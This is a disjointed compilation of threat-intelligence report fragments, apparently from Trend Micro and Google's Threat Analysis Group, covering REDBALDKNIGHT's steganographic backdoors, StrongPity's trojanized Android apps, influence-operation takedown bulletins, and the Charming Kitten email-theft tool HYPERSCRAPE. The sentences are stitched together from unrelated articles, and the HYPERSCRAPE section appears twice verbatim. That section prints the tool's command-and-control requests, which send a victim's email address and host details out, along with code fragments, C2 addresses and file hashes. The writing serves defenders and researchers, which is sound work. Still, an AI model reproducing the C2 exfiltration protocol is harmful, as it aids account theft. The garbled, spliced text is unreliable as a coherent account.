"Like many cyberespionage campaigns, REDBALDKNIGHT’s attacks are intermittent but drawn-out."
The specificity of their targets stems from the social engineering tactics used.
"One of the decoy documents, for instance, was about the “plan of disaster prevention in heisei 20” (Heisei is the current/modern era in Japan). Figure 1: File properties of one of the decoy documents that REDBALDKNIGHT sends to Japanese targets Figures 2: Sample of decoy documents used by REDBALDKNIGHT, employing socially engineered titles in their spear phishing emails such as “disaster prevention”"
Attack ChainREDBALDKNIGHT’s attacks typically use spear phishing emails as an entry point.
"Their attachments exploit a vulnerability in Ichitaro, as shown above."
"Based on the hardcoded version number they divulged (Version:1.15.11.26TB Mini), we were able to source other versions of the backdoor (listed in the appendix)."
"Version v1.40 Mini uses the MPRESS packer, which provides some degree of protection against AV detection and reverse engineering."
How REDBALDKNIGHT Employs
"SteganographyDaserf’s infection chain accordingly evolved, as shown below."
"It has several methods for infecting its targets of interest: spear phishing emails, watering hole attacks, and exploiting a remote code execution vulnerability (CVE-2016-7836, patched last March 2017) in SKYSEA Client View, an IT asset management software widely used in Japan."
REDBALDKNIGHT’s use of steganography isn’t limited to Daserf.
"Based on their pdb strings, they’re both components of another REDBALDKNIGHT-related threat, XXMM (TROJ_KVNDM), a downloader Trojan that can also act as a first-stage backdoor with its capability to open a shell."
"While xxmm2_builder allows REDBALDKNIGHT to customize the settings of XXMM, xxmm2_ steganography is used to hide malicious code within an image file."
"REDBALDKNIGHT’s tool can create, embed, and hide executables or configuration files within the image file with its tag and encrypted strings via steganography."
"Additionally, we also found that the steganography algorithm (alternative base64 + RC4) between XXMM and Daserf were the same."
"Figure 4: Code snippets showing Daserf’s decode function, which is the same as XXMM’s Figure 5: Steganography toolkit used by REDBALDKNIGHT for XXMM Figure 6:"
"Snapshots of Daserf’s steganographic code generated by their toolkit MitigationSteganography is a particularly useful technique in purposeful cyberattacks: the longer their malicious activities stay undetected, the more they can steal and exfiltrate data."
Safeguard the email gateway to defend against REDBALDKNIGHT’s spear phishing methods.
"It provides a comprehensive defense tailored to protect organizations against targeted attacks and advanced threats through specialized engines, custom sandboxing, and seamless correlation across the entire attack lifecycle, allowing it to detect threats like REDBALDKNIGHT’s attacks even without any engine or pattern update."
"Due to the suspicious nature of this activity, we decided to investigate further."
Initial investigation
The first thing we did was check the URL where the malicious APK file was hosted (https://egov[.]sy/mobile/egov[.]apk).
These benign versions of the application were created during the period from February 2020 until March 2021.
"Although some antivirus vendors detect the identified malicious sample as Bahamut, we doubted the accuracy of this attribution to the Bahamut APT group."
Further investigation revealed several artifacts that could possibly link the malicious sample to the StrongPity APT group.
"The malicious version of the application (fd1aac87399ad22234c503d8adb2ae9f0d950b6edf4456b1515a30100b5656a7) was created on May 2021(The timestamps within the file point to 2021-05-03 as the creation date, while the file was uploaded to VirusTotal on May 24, 2021)."
Figure 1.
The modified AndroidManifest.xml of the malicious app Overview of the inserted code
Figure 3.
Malicious code initialization
The receiver starts the malicious service.
The service is started when the device connectivity is changed.
The djdeeu class registers a broadcast receiver for CONNECTIVITY_CHANGE.
Architecture of the backdoor
"It defines seven message types, shown in Figure 4."
Figure 4. Code showing the seven defined messages.
Each of the messages trigger a different behavior through the handler.
"When this message is received, a periodic task for heartbeat message is set."
MSG_TRIG_ALARM_SYNC
"When this message is received, a periodic task for sync message is set."
MSG_HEARTBEAT
MSG_SYNC Sync is a repeated behavior.
"It uploads files, which were collected on infected devices, with a periodicity of 3000 seconds."
"The handler for MSG_SYNC executes the following functionality: First, it enumerates all files under <DIR>/.android/.lib2."
"It then creates a zip file with the name <uniqueId>.zip (note that the unique ID is not a real device ID, the malware just calculates a custom unique ID based on the device ID value), and writes the files into the compressed file."
MSG_COLLECT
The handler for this message collects data from the victim’s device.
A snippet of the file harvesting code MSG_TRIG_ALARM_COLLECT
"When this message is received, a periodic task for the “collect message” handler is set."
MSG_CONNECTIVITY
Modular Functionality of the backdoor
Figure 6.
Figure 7.
Code snippet showing the ltymcr(Helper Class) component sadwoo:
A component used as PowerWakeLock.
phkyxc: A component used as WifiWakeLock.
tfsdne:
itxdrx(Net Manager): A component responsible for handling HTTP protocol communication.
Figure 8.
Code from the itxdrx component nhnhpi:
The component responsible for managing the C&C server.
This component includes definition of an initial C&C server.
Figure 9.
Similar malicious samples
"Date of submission SHA256 Identified C&C servers Additional Details August 2, 2019 374d92f553c28e9dad1aa7f5d334a07dede1e5ad19c3766efde74290d0c49afb upeg-system-app[.]com Likely repacked from Kingoroot."
"June 8, 2020 be9214a5804632004f7fd5b90fbac3e23f44bb7f0a252b8277dd7e9d8b8a52f3 networktopologymaps[.]com Likely repacked from Snaptube, though It is not the same as 596257ef017b02ba6961869d78a2317500a45f00c76682a22bbdbd3391857b5d. June 8, 2020 a9378a5469319faffc48f3aa70f5b352d5acb7d361c5177a9aac90d9c58bb628 networktopologymaps[.]com Likely repacked from net[.]cybertik[.]wifi (the original app could be downloaded from the Yemeni website, cybertik[.]net)."
"June 13, 2021 596257ef017b02ba6961869d78a2317500a45f00c76682a22bbdbd3391857b5d upeg-system-app[.]com Likely repacked from Snaptube."
"January 1, 2021 75dc2829abb951ff970debfba9f66d4d7c6b7c48a823a911dd5874f74ac63d7b upn-sec3-msd[.]com This is likely a testing sample because it provides buttons to test functions."
This shows that the actor is actively involved in the development of APK versions of the backdoor.
"Table 1. Similar malicious samples found on VirusTotal The sample 75dc2829abb951ff970debfba9f66d4d7c6b7c48a823a911dd5874f74ac63d7b serves as the key attribution factor and is the main link to the StrongPity threat actor, because it communicates with a C&C server that was previously identified by several research teams as infrastructure used by the group. Tools, tactics, and procedures on Windows"
"Just as we have seen with the Android apps, the StrongPity group favors repacking benign installers to produce trojanized versions of these applications."
"Take, for example, the following sample: 48f67be806b4e823280f03ee5512ffd58deb6f37ecc80842265d4e8d2ca30055."
This dropped file is a clean WinRAR installer.
Figure 11. Code showing the creation of the directory
"If we examine another StrongPity sample (12818a96211b7c47863b109be63e951075cf6a41652464a584dd2f26010f7535), the logic is similar — it drops a normal installer into the Temp directory and creates a directory for dropped malicious files."
Possible connections to StrongPity
We found several clues that link the malicious Android samples with the StrongPity threat actor.
The sample 74582c3d920332117541a9bbc6b8995fbe7e1aff communicates with the URL https://www.upn-sec3-msd[.]com/ProxyServer/service/.
The domain name “upn-sec3-msd[.]com” was mentioned in another StrongPity report.
"For example, the domain names used by StrongPity in 2020 have a domain naming pattern similar to the domains used by the identified Android samples."
The domain was acquired via the Porkbun network registrar.
"This is similar to the domain hostoperationsystems[.]com, which was previously mentioned in the Talos report."
"For example, one of the samples that we had examined earlier, gathers files with the following extensions: .7z .asc .dgs .doc .docx .gpg .pdf .pgp .ppt .pptx .rar .rjv .rms .rtf .sft .tc .txt .xls .xlsx As we previously mentioned, there are no public reports of the StrongPity threat actor using malicious Android applications in the attack."
StrongPity actively develops new malicious android apps
We believe that the StrongPity Threat actor is actively developing backdoors for Android.
"Based on the additional functionalities that we identified in the fake Samsung security service application (75dc2829abb951ff970debfba9f66d4d7c6b7c48a823a911dd5874f74ac63d7b), we think that among the APK files that we had identified, the repackaged applications are bundled with the first version of the Android trojan, while the fake application could be a work in progress for the next version of the tool."
The following table shows the types that the threat actor has defined.
Message types defined by the threat actor
"However, we were not able to find any of these modules in the wild."
"Version 2 has an ability to execute “su” command, if the device is rooted."
Version 2 uses SQLite to store collected data.
"Furthermore, it no longer uses ZIP."
Conclusion
"Typically, these websites would require its users to download the applications directly onto their devices."
"In order to do so, these users would be required to enable installation of the applications from “unknown sources” on their devices."
Indicators of Compromise (IOCs) Files
SHA256 Description
Detection fd1aac87399ad22234c503d8adb2ae9f0d950b6edf4456b1515a30100b5656a7
"The trojanized version of the Syria eGov Application AndroidOS_StrongPity.HRX 374d92f553c28e9dad1aa7f5d334a07dede1e5ad19c3766efde74290d0c49afb Sample repackaged from Kingoroot AndroidOS_StrongPity.HRX a9378a5469319faffc48f3aa70f5b352d5acb7d361c5177a9aac90d9c58bb628 Sample repackaged from net.cybertik.wifi AndroidOS_StrongPity.HRX be9214a5804632004f7fd5b90fbac3e23f44bb7f0a252b8277dd7e9d8b8a52f3 Repackaged from Snaptube AndroidOS_StrongPity.HRX 596257ef017b02ba6961869d78a2317500a45f00c76682a22bbdbd3391857b5d Repackaged from Snaptube AndroidOS_StrongPity.HRX 75dc2829abb951ff970debfba9f66d4d7c6b7c48a823a911dd5874f74ac63d7b Fake Samsung Security Service sample AndroidOS_StrongPity.HRX Network C&C Infrastructure SHA256 Domain Detection fd1aac87399ad22234c503d8adb2ae9f0d950b6edf4456b1515a30100b5656a7 Internetwideband[.]com AndroidOS_StrongPity.HRX 374d92f553c28e9dad1aa7f5d334a07dede1e5ad19c3766efde74290d0c49afb upeg-system-app[.]com AndroidOS_StrongPity.HRX a9378a5469319faffc48f3aa70f5b352d5acb7d361c5177a9aac90d9c58bb628 networktopologymaps[.]com AndroidOS_StrongPity.HRX be9214a5804632004f7fd5b90fbac3e23f44bb7f0a252b8277dd7e9d8b8a52f3 networktopologymaps[.]com AndroidOS_StrongPity.HRX 596257ef017b02ba6961869d78a2317500a45f00c76682a22bbdbd3391857b5d upeg-system-app[.]com AndroidOS_StrongPity.HRX 75dc2829abb951ff970debfba9f66d4d7c6b7c48a823a911dd5874f74ac63d7b upn-sec3-msd[.]com AndroidOS_StrongPity.HRX Tags APT & Targeted Attacks | Research | Mobile | Articles, News, Reports"
"On any given day, Google's Threat Analysis Group (TAG) is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries."
"Our team of analysts and security experts is focused on identifying and stopping issues like phishing campaigns, zero-day vulnerabilities and hacking against Google, our products and our users."
"Today, we’re sharing recent findings on government-backed phishing, threats and disinformation, as well as a new bulletin to share information about actions we take against accounts that we attribute to coordinated influence campaigns."
"Last month, we sent 1,755 warnings to users whose accounts were targets of government-backed attackers."
"Generally, 2020 has been dominated by COVID-19."
"And as others have reported, we’re seeing a resurgence in COVID-related hacking and phishing attempts from numerous commercial and government-backed attackers."
"To help protect users against these kinds of tracks, our Advanced Protection Program (APP) utilizes hardware security keys and provides the strongest protections available against phishing and account hijackings."
APP was designed specifically for high-risk accounts.
"Our products are designed with robust built-in security features, like Gmail protections against phishing and Safe Browsing in Chrome, but we still dedicate significant resources to developing new tools and technology to help identify, track and stop this kind of activity."
"We will also continue to share more detailed analysis of vulnerabilities we find, phishing and malware campaigns that we see, and other interesting or noteworthy trends across this space."
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q1 of 2020.
"It was last updated on May 27, 2020."
We terminated 3 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We received leads from Graphika that supported us in this investigation.
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q1 2022.
"It was last updated on May 12, 2022."
We have also taken extraordinary measures beyond our actions against coordinated influence operations to protect users and stop the spread of misinformation and disinformation about the war in Ukraine online.
We encourage anyone who discovers a Chrome vulnerability to report that activity through the Chrome Vulnerabilities Rewards Program submission process.
"Their blog contains write-ups and analysis of vulnerabilities that have been publicly disclosed, including “guest” posts from unwitting legitimate security researchers, likely in an attempt to build additional credibility with other security researchers."
"In the video, they purported to show a successful working exploit that spawns a cmd.exe shell, but a careful review of the video shows the exploit is fake."
"Within the Visual Studio Project would be source code for exploiting the vulnerability, as well as an additional DLL that would be executed through Visual Studio Build Events."
The DLL is custom malware that would immediately begin communicating with actor-controlled C2 domains.
"In addition to targeting users via social engineering, we have also observed several cases where researchers have been compromised after visiting the actors’ blog."
We encourage anyone who discovers a Chrome vulnerability to report that activity via the Chrome VRP submission process.
"If you have communicated with any of these accounts or visited the actors’ blog, we suggest you review your systems for the IOCs provided below."
Host IOCs Registry Keys HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\KernelConfig HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverConfig HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SSL Update File Paths C:\Windows\System32\Nwsapagent.sys C:\Windows\System32\helpsvc.sys C:\ProgramData\USOShared\uso.bin C:\ProgramData\VMware\vmnat-update.bin C:\ProgramData\VirtualBox\update.bin
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q4 2020.
"It was last updated on January 26, 2021."
We terminated 12 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Russia.
We received leads from Facebook that supported us in this investigation.
We terminated 2 YouTube channels as part of our investigation into coordinated influence operations linked to Myanmar.
We terminated 35 YouTube channels as part of our investigation into coordinated influence operations linked to Azerbaijan.
We received leads from the FBI that supported us in this investigation.
We terminated 2 YouTube channels as part of our ongoing investigation into a coordinated influence operation linked to Iran.
We terminated 10 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Russia.
We terminated 22 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Indonesia.
We received leads from the FBI that supported us in this investigation.
We terminated 3 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We terminated 9 YouTube channels as part of our investigation into a coordinated influence operation linked to Egypt.
We terminated 6 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We terminated 1 YouTube channel as part of our ongoing investigation into coordinated influence operations linked to Myanmar.
We terminated 1 blog as part of our investigation into coordinated influence operations linked to Argentina.
We terminated 3 YouTube channels as part of our investigation into coordinated influence operations linked to France.
We terminated 34 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Myanmar.
"We terminated 3,317 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China."
"In June, we announced that we saw phishing attempts against the personal email accounts of staffers on the Biden and Trump campaigns by Chinese and Iranian APTs (Advanced Persistent Threats) respectively."
We haven’t seen any evidence of such attempts being successful.
The Iranian attacker group (APT35) and the Chinese attacker group (APT31) targeted campaign staffers’ personal emails with credential phishing emails and emails containing tracking links.
"As part of our wider tracking of APT31 activity, we've also seen them deploy targeted malware campaigns."
"Every malicious piece of this attack was hosted on legitimate services, making it harder for defenders to rely on network signals for detection."
"In one example, attackers impersonated McAfee."
"The targets would be prompted to install a legitimate version of McAfee anti-virus software from GitHub, while malware was simultaneously silently installed to the system."
This targeting is consistent with what others have subsequently reported.
"Shortly after the U.S. Treasury sanctioned Ukrainian Parliament member Andrii Derkach for attempting to influence the U.S. electoral process, we removed 14 Google accounts that were linked to him."
"As the course of the COVID-19 pandemic evolves, we’ve seen threat actors evolve their tactics as well."
"In previous posts, we discussed targeting of health organizations as well as attacker efforts to impersonate the World Health Organization."
"In the threat actor toolkit, different types of attacks are used for different purposes: Phishing campaigns can be used like a scalpel—targeting specific groups or individuals with personalized lures that are more likely to trick them into taking action (like clicking on a malware link), while DDoS attacks are more like a hatchet—disrupting or blocking a site or a service entirely."
"While it’s less common to see DDoS attacks rather than phishing or hacking campaigns coming from government-backed threat groups, we’ve seen bigger players increase their capabilities in launching large-scale attacks in recent years."
"For example in 2017, our Security Reliability Engineering team measured a record-breaking UDP amplification attack sourced out of several Chinese ISPs (ASNs 4134, 4837, 58453, and 9394), which remains the largest bandwidth attack of which we are aware."
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q3 2020.
"It was last updated on October 16, 2020."
We terminated 299 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China.
We terminated 8 YouTube channels as part of our actions against a coordinated influence operation linked to Yemen.
We terminated 4 YouTube channels as part of our actions against a coordinated influence operation.
"We terminated 1,628 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China."
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q2 of 2020.
"It was last updated on August 5, 2020."
We received leads from Graphika that supported us in this investigation.
We terminated 7 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Russia.
We terminated 186 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China.
"We terminated 1,098 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China."
We received leads from Graphika that supported us in this investigation.
"We terminated 1,312 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China."
We terminated 17 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Russia.
"In December 2021, TAG discovered a novel Charming Kitten tool, named HYPERSCRAPE, used to steal user data from Gmail, Yahoo!, and Microsoft Outlook accounts."
The attacker runs HYPERSCRAPE on their own machine to download victims’ inboxes using previously acquired credentials.
We have seen it deployed against fewer than two dozen accounts located in Iran.
HYPERSCRAPE demonstrates Charming Kitten’s commitment to developing and maintaining purpose-built capabilities.
"Like much of their tooling, HYPERSCRAPE is not notable for its technical sophistication, but rather its effectiveness in accomplishing Charming Kitten’s objectives."
"HYPERSCRAPE requires the victim’s account credentials to run using a valid, authenticated user session the attacker has hijacked, or credentials the attacker has already acquired."
HYPERSCRAPE won't run unless in a directory with other file dependencies.
In later versions it was obfuscated with Base64.
GET http://{C2}/Index.php?Ck=OK HTTP/1.1
Accept-Encoding: gzip Connection: Keep-Alive
A new form is displayed if the information is not provided via command prompt.
"Again, the response is expected to be ""OK""."
GET http://{C2}/Index.php?vubc={identity} HTTP/1.1
"A new folder named ""Download"" is created adjacent to the main binary."
The browser then navigates to Gmail to begin the data collection.
"If the cookies failed to provide access to the account, a login page is displayed and the attacker can manually enter credentials to proceed, as the program will wait until it finds the inbox page."
"Once the attacker has logged in to the victim’s account, HYPERSCRAPE checks to see if the language is set to English, changing it if not."
The language is returned to its original setting when the run is finished.
HYPERSCRAPE then begins iterating through all available tabs in the inbox looking for emails to download.
A log file is written containing a count of the emails that were downloaded.
"POST http://{C2}/?Key={GUID}&Crc={Identifier} { ""appName"": ""Gmail Downloader"", ""targetname"": ""{Email}"", ""HostName"": ""REDACTED"", ""srcUserIP"": ""REDACTED"", ""actionType"": ""First"", ""timeOccurrence"": ""05/01/2022 05:50:31 PM"", ""OS"": ""REDACTED"", ""OSVersion"": ""REDACTED"", ""SystemModel"": ""REDACTED"", ""SystemType"": ""REDACTED"", ""srcName"": ""REDACTED"", ""srcOrgName"": ""REDACTED"" }"
"x.TextContent.StartsWith(""Access for less secure apps has been turned on"") ||"
"x.TextContent.StartsWith(""Review blocked sign-in attempt"") || x.TextContent."
"x.TextContent.StartsWith(""Access for less secure apps has been turned on"") select x).ToList"
GeckoHtmlElement > (
"public void ManageTakeOut() { string text = ""PipeName"";"
jsonInfo.Data = this.OperationObject.GetUsername(); pipeCommunication.Write(jsonInfo); break; } }
pipeCommunication.Close(); }
We’ll also continue to apply those findings internally to improve the safety and security of our products so we can effectively combat threats and protect users who rely on our services.
"In the meantime, we encourage high risk users to enroll in our Advanced Protection Program (APP) and utilize Google Account Level Enhanced Safe Browsing to ensure they have the greatest level of protection in the face of ongoing threats."
C2s 136.243.108.14 173.209.51.54 HYPERSCRAPE binaries
03d0e7ad4c12273a42e4c95d854408b98b0cf5ecf5f8c5ce05b24729b6f4e369 35a485972282b7e0e8e3a7a9cbf86ad93856378fd96cc8e230be5099c4b89208 5afc59cd2b39f988733eba427c8cf6e48bd2e9dc3d48a4db550655efe0dca798 6dc0600de00ba6574488472d5c48aa2a7b23a74ff1378d8aee6a93ea0ee7364f 767bd025c8e7d36f64dbd636ce0f29e873d1e3ca415d5ad49053a68918fe89f4 977f0053690684eb509da27d5eec2a560311c084a4a133191ef387e110e8b85f ac8e59e8abeacf0885b451833726be3e8e2d9c88d21f27b16ebe00f00c1409e6 cd2ba296828660ecd07a36e8931b851dda0802069ed926b3161745aae9aa6daa Microsoft Live DLL 1a831a79a932edd0398f46336712eff90ebb5164a189ef38c4dacc64ba84fe23 PDB E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\EmailDownloader\obj\Debug\EmailDownloader.pdb E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\Mahdi\LiveLib\obj\Release\LiveLib.pdb
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q2 2022.
"It was last updated on July 29, 2022."
Vision One integrates with Palo Alto Networks Cortex™ XSOAR to drive automated response to incidents uncovered by Vision One.
Having the incident details available in the Cortex™ XSOAR platform enables analysts to execute a series of manual or automated actions through the Trend Micro Vision One™ platform in response to a potential threat.
"Collect files Collects the specified file from an endpoint during an investigation Submit a file for sandbox analysis Submits a file to the Trend Micro Vision One sandbox for automated analysis Retrieve sandbox analysis report Retrieves the analysis report, IOCs, or artifacts available after automated analysis Quarantine email message"
Delete email message Permanently deletes the specified email message from the user’s mailbox
"Gather information on an endpoint Gathers information from the endpoint such as the current logged on user, operating system details, IP address, hostname, mac address"
Terminate process Terminates the specified process if currently running on an endpoint Isolate endpoint Blocks all network activity on an endpoint while the system is being investigated
Restore endpoint connection Restores the network connectivity on an endpoint after investigation and/or remediation has occurred
"Scenario: If credential dumping was detected on a host, the security operations team wanted to automate the collection of artifacts to be used during a subsequent investigation."
Trend Micro Vision One™ is very effective at identifying the various techniques threat actors use to discover credentials.
"However, since threat actors tend to cover their tracks quickly, by the time the security analyst is reviewing the incident, there is a chance that critical information may have been permanently deleted and is no longer readily accessible. Instead of depending on a security analyst to review a credential dumping event and manually collecting artifacts for their investigation, Trend Micro wanted to automate the collection of this evidence as quickly as possible when a detection occurs."
The first step in our playbook is to check if the event is related to credential dumping.
"After we have gathered the information, the next step is to collect the file from the endpoint using the command “trendmicro-visionone-collect-forensic-file”."
We need to request that a download link be generated for the collected files with the “trendmicro-visionone-download-information-for-collected-forensic-file”.
"Once we have the download link, we can then use the Cortex™ XSOAR built-in command “http” to retrieve the file and save it to the War Room for this incident so that it can be downloaded and analyzed. This is just one example use case that we have seen implemented to automate security operations by leveraging the integration between Trend Micro Vision One™ and Palo Alto Networks Cortex™ XSOAR."
Copyright © 2022.
Trend Micro Incorporated.
All rights reserved.
Cortex XSOAR is a trademark of Palo Alto Networks.
"In December 2021, TAG discovered a novel Charming Kitten tool, named HYPERSCRAPE, used to steal user data from Gmail, Yahoo!, and Microsoft Outlook accounts."
The attacker runs HYPERSCRAPE on their own machine to download victims’ inboxes using previously acquired credentials.
We have seen it deployed against fewer than two dozen accounts located in Iran.
HYPERSCRAPE demonstrates Charming Kitten’s commitment to developing and maintaining purpose-built capabilities.
"Like much of their tooling, HYPERSCRAPE is not notable for its technical sophistication, but rather its effectiveness in accomplishing Charming Kitten’s objectives."
"HYPERSCRAPE requires the victim’s account credentials to run using a valid, authenticated user session the attacker has hijacked, or credentials the attacker has already acquired."
HYPERSCRAPE won't run unless in a directory with other file dependencies.
In later versions it was obfuscated with Base64.
GET http://{C2}/Index.php?Ck=OK HTTP/1.1
Accept-Encoding: gzip Connection: Keep-Alive
A new form is displayed if the information is not provided via command prompt.
"Again, the response is expected to be ""OK""."
GET http://{C2}/Index.php?vubc={identity} HTTP/1.1
"A new folder named ""Download"" is created adjacent to the main binary."
The browser then navigates to Gmail to begin the data collection.
"If the cookies failed to provide access to the account, a login page is displayed and the attacker can manually enter credentials to proceed, as the program will wait until it finds the inbox page."
"Once the attacker has logged in to the victim’s account, HYPERSCRAPE checks to see if the language is set to English, changing it if not."
The language is returned to its original setting when the run is finished.
HYPERSCRAPE then begins iterating through all available tabs in the inbox looking for emails to download.
A log file is written containing a count of the emails that were downloaded.
"POST http://{C2}/?Key={GUID}&Crc={Identifier} { ""appName"": ""Gmail Downloader"", ""targetname"": ""{Email}"", ""HostName"": ""REDACTED"", ""srcUserIP"": ""REDACTED"", ""actionType"": ""First"", ""timeOccurrence"": ""05/01/2022 05:50:31 PM"", ""OS"": ""REDACTED"", ""OSVersion"": ""REDACTED"", ""SystemModel"": ""REDACTED"", ""SystemType"": ""REDACTED"", ""srcName"": ""REDACTED"", ""srcOrgName"": ""REDACTED"" }"
"x.TextContent.StartsWith(""Access for less secure apps has been turned on"") ||"
"x.TextContent.StartsWith(""Review blocked sign-in attempt"") || x.TextContent."
"x.TextContent.StartsWith(""Access for less secure apps has been turned on"") select x).ToList"
GeckoHtmlElement > (
"public void ManageTakeOut() { string text = ""PipeName"";"
jsonInfo.Data = this.OperationObject.GetUsername(); pipeCommunication.Write(jsonInfo); break; } }
pipeCommunication.Close(); }
We’ll also continue to apply those findings internally to improve the safety and security of our products so we can effectively combat threats and protect users who rely on our services.
C2s 136.243.108.14 173.209.51.54 HYPERSCRAPE binaries
03d0e7ad4c12273a42e4c95d854408b98b0cf5ecf5f8c5ce05b24729b6f4e369 35a485972282b7e0e8e3a7a9cbf86ad93856378fd96cc8e230be5099c4b89208 5afc59cd2b39f988733eba427c8cf6e48bd2e9dc3d48a4db550655efe0dca798 6dc0600de00ba6574488472d5c48aa2a7b23a74ff1378d8aee6a93ea0ee7364f 767bd025c8e7d36f64dbd636ce0f29e873d1e3ca415d5ad49053a68918fe89f4 977f0053690684eb509da27d5eec2a560311c084a4a133191ef387e110e8b85f ac8e59e8abeacf0885b451833726be3e8e2d9c88d21f27b16ebe00f00c1409e6 cd2ba296828660ecd07a36e8931b851dda0802069ed926b3161745aae9aa6daa Microsoft Live DLL 1a831a79a932edd0398f46336712eff90ebb5164a189ef38c4dacc64ba84fe23 PDB E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\EmailDownloader\obj\Debug\EmailDownloader.pdb E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\Mahdi\LiveLib\obj\Release\LiveLib.pdb
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q2 2022.
"It was last updated on July 29, 2022."
We use our research to continuously improve the safety and security of our products and share this intelligence with our industry peers.
And we don’t just plug security holes – we work to eliminate entire classes of threats for consumers and businesses whose work depends on the Internet.
We observed fewer than three dozen installs of this spyware.
NSO Group continues to pose risks across the Internet ecosystem.
"In 2019, we confronted the risks posed by NSO Group again, relying upon NSO Groups’s marketing information suggesting that they had a 0-day exploit for Android."
"In December 2021, we released research about novel techniques used by NSO Group to compromise iMessage users."
"We believe its use is growing, fueled by demand from governments."
We have also observed proliferation risk from nation state actors attempting to gain access to the exploits of these vendors.
"While vulnerability research is an important contributor to online safety when that research is used to improve the security of products, vendors stockpiling zero-day vulnerabilities in secret can pose a severe risk to the Internet when the vendor itself gets compromised."
"This has happened to multiple spyware vendors over the past ten years, raising the specter that their stockpiles can be released publicly without warning."
"The proliferation of commercial hacking tools is a threat to national security, making the Internet less safe and undermining the trust on which a vibrant, inclusive digital society depends."
Safe Browsing also notifies webmasters when their websites are compromised by malicious actors and helps them diagnose and resolve the problem so that their visitors stay safer.
"On Gmail, we recommend certain Gmail security precautions to prevent spoofing, phishing, and spam."
"We use email authentication to protect against email spoofing, which is when email content is changed to make the message appear from someone or somewhere other than the actual source."
And we offer other advanced phishing and malware protection to administrators to better protect their users.
"During the development stage, Android-created and open source components are subject to vigorous security reviews"
"For users, Android provides safety and control over how apps and third parties can access the data from their devices."
"APP has a strong track record protecting users – since the program’s inception, there are no documented cases of an account compromise via phishing."
The first step is to understand the scope of the problem.
Any one government’s ability to meaningfully impact this market is limited; only through a concerted international effort can this serious risk to online safety be mitigated.
"While we continue to fight these threats on a technical level, the providers of these capabilities operate openly in democratic countries."
This is the first known instance of Turla distributing Android-related malware.
The app is distributed under the guise of performing Denial of Service (DoS) attacks against a set of Russian websites.
"During our investigation into the Turla CyberAzov apps, we identified another Android app first seen in the wild in March 2022 that also claimed to conduct DoS attacks against Russian websites."
Follina is a remote code execution (RCE) vulnerability in the Microsoft Windows Support Diagnostic Tool (MSDT).
"Consistent with CERT-UA reporting, TAG observed multiple Russian GRU actors - APT28 and Sandworm - conduct campaigns exploiting the Follina vulnerability."
"The Sandworm campaign used compromised government accounts to send links to Microsoft Office documents hosted on compromised domains, primarily targeting media organizations in Ukraine."
TAG has also observed an increasing number of financially motivated actors targeting Ukraine.
"We assess this actor is a former initial ransomware access broker who previously worked with the Conti ransomware group distributing the IcedID banking trojan based on overlaps in infrastructure, tools used in previous campaigns, and a unique cryptor."
They continue to use the 'Browser in the Browser' phishing technique that TAG first observed and described in March.
"COLDRIVER, a Russian-based threat actor sometimes referred to as Callisto, continues to send credential phishing emails to targets including government and defense officials, politicians, NGOs and think tanks, and journalists."
"In addition to including phishing links directly in the email, the attackers also link to PDFs and/or DOCs, hosted on Google Drive and Microsoft One Drive, that contain a link to an attacker-controlled phishing domain."
These phishing domains have been blocked through Google Safe Browsing – a service that identifies unsafe websites across the web and notifies users and website owners of potential harm.
Recently observed COLDRIVER indicators: In another campaign tracked by CERT-UA as UAC-0056 we observed compromised email addresses of a Regional Prosecutor’s office of Ukraine leveraged to send malicious Microsoft Excel documents with VBA macros delivering Cobalt Strike.
Email contents vary from COVID-19 vaccine policy to the humanitarian crisis in Ukraine.
"We have seen hack-for-hire groups target human rights and political activists, journalists, and other high-risk users around the world, putting their privacy, safety and security at risk."
"They also conduct corporate espionage, handily obscuring their clients’ role."
India
"One cluster of this activity frequently targets government, healthcare, and telecom sectors in Saudi Arabia, the United Arab Emirates, and Bahrain with credential phishing campaigns."
These credential phishing campaigns have ranged from targeting specific government organizations to AWS accounts to Gmail accounts.
Russia
"While investigating a 2017 credential phishing campaign that targeted a prominent Russian anti-corruption journalist, we discovered the Russian attacker targeting other journalists, politicians across Europe, and various NGOs and non-profit organizations."
This hack-for-hire actor has been publicly referred to as 'Void Balaur'.
"These campaigns were similar regardless of target, consisting of a credential phishing email with a link to an attacker-controlled phishing page."
Amnesty International has also reported on their campaigns.
"The group commonly uses Google or OWA password reset lures to steal credentials from targets, often using the MailJet or SendGrid API to send phishing emails."
"Unlike many hack-for-hire actors that use open source phishing frameworks like Evilginx or GoPhish, this group uses a custom phishing kit that utilizes Selenium, a self described 'suite of tools for automating web browsers.'"
"Previously described by Amnesty, this phishing kit has remained under active development over the past five years."
"After compromising an account, the actor maintains persistence by granting themselves an OAuth token to a legitimate email app like Thunderbird, or by linking the victim Gmail account to an attacker-owned account on a third-party mail provider."
"This group also has links to the original developers of H-Worm, also known as njRAT."
"Benabdellah, who also goes by the moniker Houdini, has been actively involved in the day-to-day development and operational deployment of the credential phishing capabilities used by this group since its inception."
